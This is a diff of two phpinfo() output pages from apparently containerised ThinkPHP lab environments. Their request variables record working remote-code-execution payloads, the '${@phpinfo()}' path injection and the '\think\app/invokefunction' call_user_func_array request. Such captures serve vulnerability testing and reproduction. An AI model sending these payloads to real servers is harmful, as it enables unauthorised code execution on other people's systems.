+<tr><td class="e">Compiled Version </td><td class="v">1.2.11 </td></tr>
+<tr><td class="e">Linked Version </td><td class="v">1.2.11 </td></tr>
+</table>
+<table>
 <tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
 <tr><td class="e">zlib.output_compression</td><td class="v">Off</td><td class="v">Off</td></tr>
 <tr><td class="e">zlib.output_compression_level</td><td class="v">-1</td><td class="v">-1</td></tr>
 <tr><td class="e">zlib.output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
-</table><br />
+</table>
 <h2>Additional Modules</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>Module Name</th></tr>
-</table><br />
+</table>
 <h2>Environment</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>Variable</th><th>Value</th></tr>
-<tr><td class="e">PHP_EXTRA_CONFIGURE_ARGS </td><td class="v">--with-apxs2 </td></tr>
-<tr><td class="e">PHP_VERSION </td><td class="v">5.5.38 </td></tr>
-<tr><td class="e">APACHE_RUN_DIR </td><td class="v">/var/run/apache2 </td></tr>
-<tr><td class="e">APACHE_LOCK_DIR </td><td class="v">/var/lock/apache2 </td></tr>
+<tr><td class="e">PHP_CPPFLAGS </td><td class="v">-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 </td></tr>
+<tr><td class="e">PHP_ASC_URL </td><td class="v">https://www.php.net/distributions/php-7.2.31.tar.xz.asc </td></tr>
 <tr><td class="e">PHP_EXTRA_BUILD_DEPS </td><td class="v">apache2-dev </td></tr>
-<tr><td class="e">APACHE_CONFDIR </td><td class="v">/etc/apache2 </td></tr>
-<tr><td class="e">PHP_SHA256 </td><td class="v">cb527c44b48343c8557fe2446464ff1d4695155a95601083e5d1f175df95580f </td></tr>
-<tr><td class="e">SHLVL </td><td class="v">0 </td></tr>
-<tr><td class="e">APACHE_RUN_GROUP </td><td class="v">www-data </td></tr>
-<tr><td class="e">LANG </td><td class="v">C </td></tr>
-<tr><td class="e">PWD </td><td class="v">/var/www/html </td></tr>
-<tr><td class="e">GPG_KEYS </td><td class="v">0B96609E270F565C13292B24C13C70B87267B52D 0BD78B5F97500D450838F95DFE857D9A90D90EC1 F38252826ACD957EF380D39F2F7956BC5DA04B5D </td></tr>
 <tr><td class="e">PATH </td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin </td></tr>
-<tr><td class="e">APACHE_LOG_DIR </td><td class="v">/var/log/apache2 </td></tr>
-<tr><td class="e">APACHE_ENVVARS </td><td class="v">/etc/apache2/envvars </td></tr>
-<tr><td class="e">PHPIZE_DEPS </td><td class="v">autoconf 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c </td></tr>
-<tr><td class="e">PHP_FILENAME </td><td class="v">php-5.5.38.tar.xz </td></tr>
-<tr><td class="e">PHP_INI_DIR </td><td class="v">/usr/local/etc/php </td></tr>
 <tr><td class="e">APACHE_RUN_USER </td><td class="v">www-data </td></tr>
-<tr><td class="e">HOSTNAME </td><td class="v">13933fbfb0f9 </td></tr>
+<tr><td class="e">APACHE_ENVVARS </td><td class="v">/etc/apache2/envvars </td></tr>
+<tr><td class="e">APACHE_RUN_DIR </td><td class="v">/var/run/apache2 </td></tr>
+<tr><td class="e">PHP_CFLAGS </td><td class="v">-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 </td></tr>
+<tr><td class="e">SHLVL </td><td class="v">0 </td></tr>
+<tr><td class="e">PHP_EXTRA_CONFIGURE_ARGS </td><td class="v">--with-apxs2 --disable-cgi </td></tr>
+<tr><td class="e">APACHE_LOCK_DIR </td><td class="v">/var/lock/apache2 </td></tr>
+<tr><td class="e">APACHE_RUN_GROUP </td><td class="v">www-data </td></tr>
+<tr><td class="e">PHP_URL </td><td class="v">https://www.php.net/distributions/php-7.2.31.tar.xz </td></tr>
+<tr><td class="e">PHPIZE_DEPS </td><td class="v">autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c </td></tr>
 <tr><td class="e">APACHE_PID_FILE </td><td class="v">/var/run/apache2/apache2.pid </td></tr>
-</table><br />
+<tr><td class="e">PHP_SHA256 </td><td class="v">8beaa634bb878a96af9bc8643811ea46973f5f41ad2bfb6ab4cfd290e5a39806 </td></tr>
+<tr><td class="e">LANG </td><td class="v">C </td></tr>
+<tr><td class="e">APACHE_LOG_DIR </td><td class="v">/var/log/apache2 </td></tr>
+<tr><td class="e">APACHE_DOCUMENT_ROOT </td><td class="v">/var/www/public </td></tr>
+<tr><td class="e">PWD </td><td class="v">/var/www/public </td></tr>
+<tr><td class="e">PHP_LDFLAGS </td><td class="v">-Wl,-O1 -pie </td></tr>
+<tr><td class="e">GPG_KEYS </td><td class="v">1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2D6021E995DC9FF8D3EE5AF27F </td></tr>
+<tr><td class="e">PHP_INI_DIR </td><td class="v">/usr/local/etc/php </td></tr>
+<tr><td class="e">PHP_MD5 </td><td class="v"><i>no value</i> </td></tr>
+<tr><td class="e">APACHE_CONFDIR </td><td class="v">/etc/apache2 </td></tr>
+<tr><td class="e">PHP_VERSION </td><td class="v">7.2.31 </td></tr>
+<tr><td class="e">HOSTNAME </td><td class="v">2805bb2d4775 </td></tr>
+</table>
 <h2>PHP Variables</h2>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>Variable</th><th>Value</th></tr>
-<tr><td class="e">_REQUEST["s"]</td><td class="v">/index/index/name/${@phpinfo()}</td></tr>
-<tr><td class="e">_SERVER["HTTP_HOST"]</td><td class="v">localhost:8080</td></tr>
-<tr><td class="e">_SERVER["HTTP_USER_AGENT"]</td><td class="v">python-requests/2.28.1</td></tr>
-<tr><td class="e">_SERVER["HTTP_ACCEPT_ENCODING"]</td><td class="v">gzip, deflate, br</td></tr>
-<tr><td class="e">_SERVER["HTTP_ACCEPT"]</td><td class="v">*/*</td></tr>
-<tr><td class="e">_SERVER["HTTP_CONNECTION"]</td><td class="v">keep-alive</td></tr>
-<tr><td class="e">_SERVER["PATH"]</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
-<tr><td class="e">_SERVER["SERVER_SIGNATURE"]</td><td class="v">&lt;address&gt;Apache/2.4.10 (Debian) Server at localhost Port 8080&lt;/address&gt;
-</td></tr>
-<tr><td class="e">_SERVER["SERVER_SOFTWARE"]</td><td class="v">Apache/2.4.10 (Debian)</td></tr>
-<tr><td class="e">_SERVER["SERVER_NAME"]</td><td class="v">localhost</td></tr>
-<tr><td class="e">_SERVER["SERVER_ADDR"]</td><td class="v">172.19.0.2</td></tr>
-<tr><td class="e">_SERVER["SERVER_PORT"]</td><td class="v">8080</td></tr>
-<tr><td class="e">_SERVER["REMOTE_ADDR"]</td><td class="v">172.19.0.1</td></tr>
-<tr><td class="e">_SERVER["DOCUMENT_ROOT"]</td><td class="v">/var/www/html</td></tr>
-<tr><td class="e">_SERVER["REQUEST_SCHEME"]</td><td class="v">http</td></tr>
-<tr><td class="e">_SERVER["CONTEXT_PREFIX"]</td><td class="v"><i>no value</i></td></tr>
-<tr><td class="e">_SERVER["CONTEXT_DOCUMENT_ROOT"]</td><td class="v">/var/www/html</td></tr>
-<tr><td class="e">_SERVER["SERVER_ADMIN"]</td><td class="v">webmaster@localhost</td></tr>
-<tr><td class="e">_SERVER["SCRIPT_FILENAME"]</td><td class="v">/var/www/html/index.php</td></tr>
-<tr><td class="e">_SERVER["REMOTE_PORT"]</td><td class="v">59220</td></tr>
-<tr><td class="e">_SERVER["GATEWAY_INTERFACE"]</td><td class="v">CGI/1.1</td></tr>
-<tr><td class="e">_SERVER["SERVER_PROTOCOL"]</td><td class="v">HTTP/1.1</td></tr>
-<tr><td class="e">_SERVER["REQUEST_METHOD"]</td><td class="v">GET</td></tr>
-<tr><td class="e">_SERVER["QUERY_STRING"]</td><td class="v">s=/index/index/name/$%7B@phpinfo()%7D</td></tr>
-<tr><td class="e">_SERVER["REQUEST_URI"]</td><td class="v">/index.php?s=/index/index/name/$%7B@phpinfo()%7D</td></tr>
-<tr><td class="e">_SERVER["SCRIPT_NAME"]</td><td class="v">/index.php</td></tr>
-<tr><td class="e">_SERVER["PHP_SELF"]</td><td class="v">/index.php</td></tr>
-<tr><td class="e">_SERVER["REQUEST_TIME_FLOAT"]</td><td class="v">1660886540.253</td></tr>
-<tr><td class="e">_SERVER["REQUEST_TIME"]</td><td class="v">1660886540</td></tr>
-<tr><td class="e">_SERVER["argv"]</td><td class="v"><pre>Array
+<tr><td class="e">$_REQUEST['s']</td><td class="v">/Index/\think\app/invokefunction</td></tr>
+<tr><td class="e">$_REQUEST['function']</td><td class="v">call_user_func_array</td></tr>
+<tr><td class="e">$_REQUEST['vars']</td><td class="v"><pre>Array
 (
-    [0] =&gt; s=/index/index/name/$%7B@phpinfo()%7D
+    [0] =&gt; phpinfo
+    [1] =&gt; Array
+        (
+            [0] =&gt; -1
+        )
+
 )
 </pre></td></tr>
-<tr><td class="e">_SERVER["argc"]</td><td class="v">1</td></tr>
-<tr><td class="e">_SERVER["PATH_INFO"]</td><td class="v">/index/index/name/${@phpinfo()}</td></tr>
-<tr><td class="e">_ENV["PHP_EXTRA_CONFIGURE_ARGS"]</td><td class="v">--with-apxs2</td></tr>
-<tr><td class="e">_ENV["PHP_VERSION"]</td><td class="v">5.5.38</td></tr>
-<tr><td class="e">_ENV["APACHE_RUN_DIR"]</td><td class="v">/var/run/apache2</td></tr>
-<tr><td class="e">_ENV["APACHE_LOCK_DIR"]</td><td class="v">/var/lock/apache2</td></tr>
-<tr><td class="e">_ENV["PHP_EXTRA_BUILD_DEPS"]</td><td class="v">apache2-dev</td></tr>
-<tr><td class="e">_ENV["APACHE_CONFDIR"]</td><td class="v">/etc/apache2</td></tr>
-<tr><td class="e">_ENV["PHP_SHA256"]</td><td class="v">cb527c44b48343c8557fe2446464ff1d4695155a95601083e5d1f175df95580f</td></tr>
-<tr><td class="e">_ENV["SHLVL"]</td><td class="v">0</td></tr>
-<tr><td class="e">_ENV["APACHE_RUN_GROUP"]</td><td class="v">www-data</td></tr>
-<tr><td class="e">_ENV["LANG"]</td><td class="v">C</td></tr>
-<tr><td class="e">_ENV["PWD"]</td><td class="v">/var/www/html</td></tr>
-<tr><td class="e">_ENV["GPG_KEYS"]</td><td class="v">0B96609E270F565C13292B24C13C70B87267B52D 0BD78B5F97500D450838F95DFE857D9A90D90EC1 F38252826ACD957EF380D39F2F7956BC5DA04B5D</td></tr>
-<tr><td class="e">_ENV["PATH"]</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
-<tr><td class="e">_ENV["APACHE_LOG_DIR"]</td><td class="v">/var/log/apache2</td></tr>
-<tr><td class="e">_ENV["APACHE_ENVVARS"]</td><td class="v">/etc/apache2/envvars</td></tr>
-<tr><td class="e">_ENV["PHPIZE_DEPS"]</td><td class="v">autoconf 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c</td></tr>
-<tr><td class="e">_ENV["PHP_FILENAME"]</td><td class="v">php-5.5.38.tar.xz</td></tr>
-<tr><td class="e">_ENV["PHP_INI_DIR"]</td><td class="v">/usr/local/etc/php</td></tr>
-<tr><td class="e">_ENV["APACHE_RUN_USER"]</td><td class="v">www-data</td></tr>
-<tr><td class="e">_ENV["HOSTNAME"]</td><td class="v">13933fbfb0f9</td></tr>
-<tr><td class="e">_ENV["APACHE_PID_FILE"]</td><td class="v">/var/run/apache2/apache2.pid</td></tr>
-</table><br />
+<tr><td class="e">$_GET['function']</td><td class="v">call_user_func_array</td></tr>
+<tr><td class="e">$_GET['vars']</td><td class="v"><pre>Array
+(
+    [0] =&gt; phpinfo
+    [1] =&gt; Array
+        (
+            [0] =&gt; -1
+        )
+
+)
+</pre></td></tr>
+<tr><td class="e">$_SERVER['HTTP_HOST']</td><td class="v">localhost:8080</td></tr>
+<tr><td class="e">$_SERVER['HTTP_USER_AGENT']</td><td class="v">python-requests/2.28.1</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT_ENCODING']</td><td class="v">gzip, deflate, br</td></tr>
+<tr><td class="e">$_SERVER['HTTP_ACCEPT']</td><td class="v">*/*</td></tr>
+<tr><td class="e">$_SERVER['HTTP_CONNECTION']</td><td class="v">keep-alive</td></tr>
+<tr><td class="e">$_SERVER['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SIGNATURE']</td><td class="v">&lt;address&gt;Apache/2.4.38 (Debian) Server at localhost Port 8080&lt;/address&gt;
+</td></tr>
+<tr><td class="e">$_SERVER['SERVER_SOFTWARE']</td><td class="v">Apache/2.4.38 (Debian)</td></tr>
+<tr><td class="e">$_SERVER['SERVER_NAME']</td><td class="v">localhost</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADDR']</td><td class="v">172.20.0.2</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PORT']</td><td class="v">8080</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_ADDR']</td><td class="v">172.20.0.1</td></tr>
+<tr><td class="e">$_SERVER['DOCUMENT_ROOT']</td><td class="v">/var/www/public</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_SCHEME']</td><td class="v">http</td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_PREFIX']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_SERVER['CONTEXT_DOCUMENT_ROOT']</td><td class="v">/var/www/public</td></tr>
+<tr><td class="e">$_SERVER['SERVER_ADMIN']</td><td class="v">webmaster@localhost</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_FILENAME']</td><td class="v">/var/www/public/index.php</td></tr>
+<tr><td class="e">$_SERVER['REMOTE_PORT']</td><td class="v">59328</td></tr>
+<tr><td class="e">$_SERVER['GATEWAY_INTERFACE']</td><td class="v">CGI/1.1</td></tr>
+<tr><td class="e">$_SERVER['SERVER_PROTOCOL']</td><td class="v">HTTP/1.1</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_METHOD']</td><td class="v">GET</td></tr>
+<tr><td class="e">$_SERVER['QUERY_STRING']</td><td class="v">s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_URI']</td><td class="v">/index.php?s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1</td></tr>
+<tr><td class="e">$_SERVER['SCRIPT_NAME']</td><td class="v">/index.php</td></tr>
+<tr><td class="e">$_SERVER['PHP_SELF']</td><td class="v">/index.php</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME_FLOAT']</td><td class="v">1660888920.043</td></tr>
+<tr><td class="e">$_SERVER['REQUEST_TIME']</td><td class="v">1660888920</td></tr>
+<tr><td class="e">$_SERVER['argv']</td><td class="v"><pre>Array
+(
+    [0] =&gt; s=/Index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=-1
+)
+</pre></td></tr>
+<tr><td class="e">$_SERVER['argc']</td><td class="v">1</td></tr>
+<tr><td class="e">$_SERVER['PATH_INFO']</td><td class="v">/Index/\think\app/invokefunction</td></tr>
+<tr><td class="e">$_ENV['PHP_CPPFLAGS']</td><td class="v">-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</td></tr>
+<tr><td class="e">$_ENV['PHP_ASC_URL']</td><td class="v">https://www.php.net/distributions/php-7.2.31.tar.xz.asc</td></tr>
+<tr><td class="e">$_ENV['PHP_EXTRA_BUILD_DEPS']</td><td class="v">apache2-dev</td></tr>
+<tr><td class="e">$_ENV['PATH']</td><td class="v">/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</td></tr>
+<tr><td class="e">$_ENV['APACHE_RUN_USER']</td><td class="v">www-data</td></tr>
+<tr><td class="e">$_ENV['APACHE_ENVVARS']</td><td class="v">/etc/apache2/envvars</td></tr>
+<tr><td class="e">$_ENV['APACHE_RUN_DIR']</td><td class="v">/var/run/apache2</td></tr>
+<tr><td class="e">$_ENV['PHP_CFLAGS']</td><td class="v">-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64</td></tr>
+<tr><td class="e">$_ENV['SHLVL']</td><td class="v">0</td></tr>
+<tr><td class="e">$_ENV['PHP_EXTRA_CONFIGURE_ARGS']</td><td class="v">--with-apxs2 --disable-cgi</td></tr>
+<tr><td class="e">$_ENV['APACHE_LOCK_DIR']</td><td class="v">/var/lock/apache2</td></tr>
+<tr><td class="e">$_ENV['APACHE_RUN_GROUP']</td><td class="v">www-data</td></tr>
+<tr><td class="e">$_ENV['PHP_URL']</td><td class="v">https://www.php.net/distributions/php-7.2.31.tar.xz</td></tr>
+<tr><td class="e">$_ENV['PHPIZE_DEPS']</td><td class="v">autoconf 		dpkg-dev 		file 		g++ 		gcc 		libc-dev 		make 		pkg-config 		re2c</td></tr>
+<tr><td class="e">$_ENV['APACHE_PID_FILE']</td><td class="v">/var/run/apache2/apache2.pid</td></tr>
+<tr><td class="e">$_ENV['PHP_SHA256']</td><td class="v">8beaa634bb878a96af9bc8643811ea46973f5f41ad2bfb6ab4cfd290e5a39806</td></tr>
+<tr><td class="e">$_ENV['LANG']</td><td class="v">C</td></tr>
+<tr><td class="e">$_ENV['APACHE_LOG_DIR']</td><td class="v">/var/log/apache2</td></tr>
+<tr><td class="e">$_ENV['APACHE_DOCUMENT_ROOT']</td><td class="v">/var/www/public</td></tr>
+<tr><td class="e">$_ENV['PWD']</td><td class="v">/var/www/public</td></tr>
+<tr><td class="e">$_ENV['PHP_LDFLAGS']</td><td class="v">-Wl,-O1 -pie</td></tr>
+<tr><td class="e">$_ENV['GPG_KEYS']</td><td class="v">1729F83938DA44E27BA0F4D3DBDB397470D12172 B1B44D8F021E4E2D6021E995DC9FF8D3EE5AF27F</td></tr>
+<tr><td class="e">$_ENV['PHP_INI_DIR']</td><td class="v">/usr/local/etc/php</td></tr>
+<tr><td class="e">$_ENV['PHP_MD5']</td><td class="v"><i>no value</i></td></tr>
+<tr><td class="e">$_ENV['APACHE_CONFDIR']</td><td class="v">/etc/apache2</td></tr>
+<tr><td class="e">$_ENV['PHP_VERSION']</td><td class="v">7.2.31</td></tr>
+<tr><td class="e">$_ENV['HOSTNAME']</td><td class="v">2805bb2d4775</td></tr>
+</table>
 <hr />
 <h1>PHP Credits</h1>
-<table border="0" cellpadding="3" width="600">
+<table>
 <tr class="h"><th>PHP Group</th></tr>
 <tr><td class="e">Thies C. Arntzen, Stig Bakken, Shane Caraveo, Andi Gutmans, Rasmus Lerdorf, Sam Ruby, Sascha Schumann, Zeev Suraski, Jim Winstead, Andrei Zmievski </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th>Language Design &amp; Concept</th></tr>
 <tr><td class="e">Andi Gutmans, Rasmus Lerdorf, Zeev Suraski, Marcus Boerger </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+</table>
+<table>
 <tr class="h"><th colspan="2">PHP Authors</th></tr>
 <tr class="h"><th>Contribution</th><th>Authors</th></tr>
-<tr><td class="e">Zend Scripting Language Engine </td><td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Marcus Boerger, Dmitry Stogov </td></tr>
+<tr><td class="e">Zend Scripting Language Engine </td><td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Marcus Boerger, Dmitry Stogov, Xinchen Hui, Nikita Popov </td></tr>
 <tr><td class="e">Extension Module API </td><td class="v">Andi Gutmans, Zeev Suraski, Andrei Zmievski </td></tr>
 <tr><td class="e">UNIX Build and Modularization </td><td class="v">Stig Bakken, Sascha Schumann, Jani Taskinen </td></tr>
-<tr><td class="e">Windows Port </td><td class="v">Shane Caraveo, Zeev Suraski, Wez Furlong, Pierre-Alain Joye </td></tr>
+<tr><td class="e">Windows Support </td><td class="v">Shane Caraveo, Zeev Suraski, Wez Furlong, Pierre-Alain Joye, Anatol Belski, Kalle Sommer Nielsen </td></tr>
 <tr><td class="e">Server API (SAPI) Abstraction Layer </td><td class="v">Andi Gutmans, Shane Caraveo, Zeev Suraski </td></tr>
 <tr><td class="e">Streams Abstraction Layer </td><td class="v">Wez Furlong, Sara Golemon </td></tr>
 <tr><td class="e">PHP Data Objects Layer </td><td class="v">Wez Furlong, Marcus Boerger, Sterling Hughes, George Schlossnagle, Ilia Alshanetsky </td></tr>
 <tr><td class="e">Output Handler </td><td class="v">Zeev Suraski, Thies C. Arntzen, Marcus Boerger, Michael Wallner </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">Consistent 64 bit support </td><td class="v">Anthony Ferrara, Anatol Belski </td></tr>
+</table>
+<table>
 <tr class="h"><th colspan="2">SAPI Modules</th></tr>
 <tr class="h"><th>Contribution</th><th>Authors</th></tr>
-<tr><td class="e">AOLserver </td><td class="v">Sascha Schumann </td></tr>
-<tr><td class="e">Apache 1.3 (apache_hooks) </td><td class="v">Rasmus Lerdorf, Zeev Suraski, Stig Bakken, David Sklar, George Schlossnagle, Lukas Schroeder </td></tr>
-<tr><td class="e">Apache 1.3 </td><td class="v">Rasmus Lerdorf, Zeev Suraski, Stig Bakken, David Sklar </td></tr>
-<tr><td class="e">Apache 2.0 Filter </td><td class="v">Sascha Schumann, Aaron Bannert </td></tr>
 <tr><td class="e">Apache 2.0 Handler </td><td class="v">Ian Holsman, Justin Erenkrantz (based on Apache 2.0 Filter code) </td></tr>
-<tr><td class="e">Caudium / Roxen </td><td class="v">David Hedbor </td></tr>
 <tr><td class="e">CGI / FastCGI </td><td class="v">Rasmus Lerdorf, Stig Bakken, Shane Caraveo, Dmitry Stogov </td></tr>
 <tr><td class="e">CLI </td><td class="v">Edin Kadribasic, Marcus Boerger, Johannes Schlueter, Moriyoshi Koizumi, Xinchen Hui </td></tr>
-<tr><td class="e">Continuity </td><td class="v">Alex Leigh (based on nsapi code) </td></tr>
 <tr><td class="e">Embed </td><td class="v">Edin Kadribasic </td></tr>
 <tr><td class="e">FastCGI Process Manager </td><td class="v">Andrei Nigmatulin, dreamcat4, Antony Dovgal, Jerome Loyet </td></tr>
-<tr><td class="e">ISAPI </td><td class="v">Andi Gutmans, Zeev Suraski </td></tr>
 <tr><td class="e">litespeed </td><td class="v">George Wang </td></tr>
-<tr><td class="e">NSAPI </td><td class="v">Jayakumar Muthukumarasamy, Uwe Schindler </td></tr>
-<tr><td class="e">phttpd </td><td class="v">Thies C. Arntzen </td></tr>
-<tr><td class="e">pi3web </td><td class="v">Holger Zimmermann </td></tr>
-<tr><td class="e">Sendmail Milter </td><td class="v">Harald Radi </td></tr>
-<tr><td class="e">thttpd </td><td class="v">Sascha Schumann </td></tr>
-<tr><td class="e">tux </td><td class="v">Sascha Schumann </td></tr>
-<tr><td class="e">WebJames </td><td class="v">Alex Waugh </td></tr>
-</table><br />
-<table border="0" cellpadding="3" width="600">
+<tr><td class="e">phpdbg </td><td class="v">Felipe Pena, Joe Watkins, Bob Weinand </td></tr>
+</table>
+<table>
 <tr class="h"><th colspan="2">Module Authors</th></tr>
 <tr class="h"><th>Module</th><th>Authors</th></tr>
 <tr><td class="e">BC Math </td><td class="v">Andi Gutmans </td></tr>
@@ -849,36 +900,33 @@ Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br />Phar full
 <tr><td class="e">ctype </td><td class="v">Hartmut Holzgraefe </td></tr>
 <tr><td class="e">cURL </td><td class="v">Sterling Hughes </td></tr>
 <tr><td class="e">Date/Time Support </td><td class="v">Derick Rethans </td></tr>
-<tr><td class="e">DB-LIB (MS SQL, Sybase) </td><td class="v">Wez Furlong, Frank M. Kromann </td></tr>
+<tr><td class="e">DB-LIB (MS SQL, Sybase) </td><td class="v">Wez Furlong, Frank M. Kromann, Adam Baratz </td></tr>
 <tr><td class="e">DBA </td><td class="v">Sascha Schumann, Marcus Boerger </td></tr>
 <tr><td class="e">DOM </td><td class="v">Christian Stocker, Rob Richards, Marcus Boerger </td></tr>
 <tr><td class="e">enchant </td><td class="v">Pierre-Alain Joye, Ilia Alshanetsky </td></tr>
-<tr><td class="e">ereg </td><td class="v">Rasmus Lerdorf, Jim Winstead, Jaakko Hyvätti </td></tr>
 <tr><td class="e">EXIF </td><td class="v">Rasmus Lerdorf, Marcus Boerger </td></tr>
-<tr><td class="e">fileinfo </td><td class="v">Ilia Alshanetsky, Pierre Alain Joye, Scott MacVicar, Derick Rethans </td></tr>
-<tr><td class="e">Firebird/InterBase driver for PDO </td><td class="v">Ard Biesheuvel </td></tr>
+<tr><td class="e">fileinfo </td><td class="v">Ilia Alshanetsky, Pierre Alain Joye, Scott MacVicar, Derick Rethans, Anatol Belski </td></tr>
+<tr><td class="e">Firebird driver for PDO </td><td class="v">Ard Biesheuvel </td></tr>
 <tr><td class="e">FTP </td><td class="v">Stefan Esser, Andrew Skalski </td></tr>
 <tr><td class="e">GD imaging </td><td class="v">Rasmus Lerdorf, Stig Bakken, Jim Winstead, Jouni Ahto, Ilia Alshanetsky, Pierre-Alain Joye, Marcus Boerger </td></tr>
 <tr><td class="e">GetText </td><td class="v">Alex Plotnick </td></tr>
 <tr><td class="e">GNU GMP support </td><td class="v">Stanislav Malyshev </td></tr>
-<tr><td class="e">Iconv </td><td class="v">Rui Hirokawa, Stig Bakken, Moriyoshi Koizumi  </td></tr>
+<tr><td class="e">Iconv </td><td class="v">Rui Hirokawa, Stig Bakken, Moriyoshi Koizumi </td></tr>
 <tr><td class="e">IMAP </td><td class="v">Rex Logan, Mark Musone, Brian Wang, Kaj-Michael Lang, Antoni Pamies Olive, Rasmus Lerdorf, Andrew Skalski, Chuck Hagenbuch, Daniel R Kalowsky </td></tr>
 <tr><td class="e">Input Filter </td><td class="v">Rasmus Lerdorf, Derick Rethans, Pierre-Alain Joye, Ilia Alshanetsky </td></tr>
 <tr><td class="e">InterBase </td><td class="v">Jouni Ahto, Andrew Avdeev, Ard Biesheuvel </td></tr>
 <tr><td class="e">Internationalization </td><td class="v">Ed Batutis, Vladimir Iordanov, Dmitry Lakhtyuk, Stanislav Malyshev, Vadim Savchuk, Kirti Velankar </td></tr>
-<tr><td class="e">JSON </td><td class="v">Omar Kilani, Scott MacVicar </td></tr>
+<tr><td class="e">JSON </td><td class="v">Jakub Zelenka, Omar Kilani, Scott MacVicar </td></tr>
 <tr><td class="e">LDAP </td><td class="v">Amitay Isaacs, Eric Warnke, Rasmus Lerdorf, Gerrit Thomson, Stig Venaas </td></tr>
 <tr><td class="e">LIBXML </td><td class="v">Christian Stocker, Rob Richards, Marcus Boerger, Wez Furlong, Shane Caraveo </td></tr>
-<tr><td class="e">mcrypt </td><td class="v">Sascha Schumann, Derick Rethans </td></tr>
-<tr><td class="e">MS SQL </td><td class="v">Frank M. Kromann </td></tr>
 <tr><td class="e">Multibyte String Functions </td><td class="v">Tsukada Takuya, Rui Hirokawa </td></tr>
 <tr><td class="e">MySQL driver for PDO </td><td class="v">George Schlossnagle, Wez Furlong, Ilia Alshanetsky, Johannes Schlueter </td></tr>
-<tr><td class="e">MySQL </td><td class="v">Zeev Suraski, Zak Greant, Georg Richter, Andrey Hristov </td></tr>
 <tr><td class="e">MySQLi </td><td class="v">Zak Greant, Georg Richter, Andrey Hristov, Ulf Wendel </td></tr>
 <tr><td class="e">MySQLnd </td><td class="v">Andrey Hristov, Ulf Wendel, Georg Richter, Johannes Schlüter </td></tr>
 <tr><td class="e">OCI8 </td><td class="v">Stig Bakken, Thies C. Arntzen, Andy Sautins, David Benson, Maxim Maletsky, Harald Radi, Antony Dovgal, Andi Gutmans, Wez Furlong, Christopher Jones, Oracle Corporation </td></tr>
 <tr><td class="e">ODBC driver for PDO </td><td class="v">Wez Furlong </td></tr>
 <tr><td class="e">ODBC </td><td class="v">Stig Bakken, Andreas Karajannis, Frank M. Kromann, Daniel R. Kalowsky </td></tr>
+<tr><td class="e">Opcache </td><td class="v">Andi Gutmans, Zeev Suraski, Stanislav Malyshev, Dmitry Stogov, Xinchen Hui </td></tr>
 <tr><td class="e">OpenSSL </td><td class="v">Stig Venaas, Wez Furlong, Sascha Kettler, Scott MacVicar </td></tr>
 <tr><td class="e">Oracle (OCI) driver for PDO </td><td class="v">Wez Furlong </td></tr>
 <tr><td class="e">pcntl </td><td class="v">Jason Greene, Arnaud Le Blanc </td></tr>
@@ -899,10 +947,10 @@ Phar based on pear/PHP_Archive, original concept by Davey Shafik.<br />Phar full
 <tr><td class="e">SNMP </td><td class="v">Rasmus Lerdorf, Harrie Hazewinkel, Mike Jackson, Steven Lawrance, Johann Hanne, Boris Lytochkin </td></tr>
 <tr><td class="e">SOAP </td><td class="v">Brad Lafountain, Shane Caraveo, Dmitry Stogov </td></tr>
 <tr><td class="e">Sockets </td><td class="v">Chris Vandomelen, Sterling Hughes, Daniel Beulshausen, Jason Greene </td></tr>
+<tr><td class="e">Sodium </td><td class="v">Frank Denis </td></tr>
 <tr><td class="e">SPL </td><td class="v">Marcus Boerger, Etienne Kneuss </td></tr>
